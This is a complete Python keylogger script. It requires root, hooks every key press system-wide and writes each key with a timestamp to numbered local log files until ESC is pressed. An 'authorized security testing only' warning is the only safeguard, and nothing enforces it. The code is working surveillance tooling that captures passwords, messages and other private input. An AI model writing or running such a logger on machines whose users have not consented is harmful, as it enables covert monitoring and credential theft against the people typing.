from collections import deque
import keyboard
import datetime
import sys
import os
import logging
import atexit

def display_warning():
    """Display ethical usage warning and get confirmation"""
    warning = """
    !!!  IMPORTANT WARNING !!!
    =======================
    This tool should only be used for authorized security testing!
    Unauthorized monitoring of keyboard input is illegal and unethical.
    By proceeding, you agree to use this tool responsibly and lawfully.
    
    Press Enter to continue or Ctrl+C to abort...
    """
    print(warning)
    try:
        input()
    except KeyboardInterrupt:
        sys.exit(1)

def get_next_log_file():
    """Get the next available log file name"""
    counter = 1
    # Find the last existing file
    while os.path.exists(f"keyboard_logger{counter}.log"):
        counter += 1
    return f"keyboard_logger{counter}.log"

def on_key_event(event):
    """Handle key events"""
    try:
        # Handle key press events only
        if event.event_type == 'down':
            key_str = event.name
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Get current log file or create new one if none exists
            if not hasattr(on_key_event, 'current_log'):
                on_key_event.current_log = get_next_log_file()
            
            # Write to the current log file
            with open(on_key_event.current_log, "a") as f:
                f.write(f"{timestamp} - {key_str}\n")
            
    except Exception as e:
        print(f"Error logging keyboard_logger: {str(e)}")

def signal_handler(sig, frame):
    """Handle Ctrl+C signal"""
    print("\nCtrl+C detected, exiting...")
    sys.exit(0)

def check_root():
    """Check if the script is running with root privileges"""
    if os.geteuid() != 0:
        print("This script requires root privileges to monitor keyboard.")
        print("Please run with sudo:")
        print(f"sudo {sys.executable} {os.path.abspath(__file__)}")
        sys.exit(1)

def main():
    check_root()
    display_warning()
    
    try:
        print("Starting keyboard monitoring... (Press ESC to stop)")
        
        # Set up keyboard hook
        keyboard.on_press(on_key_event)
        
        # Wait for esc key
        keyboard.wait('esc')
        print("\nStopping keyboard monitoring...")
        
    except Exception as e:
        print(f"Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    main()